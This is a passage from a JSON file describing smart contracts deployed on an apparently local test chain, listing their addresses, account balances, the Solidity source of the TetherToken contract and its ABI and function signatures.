remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873535860000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0xe982E462b094850F12AF94d21D470e21bE9D0E9C",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": "Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          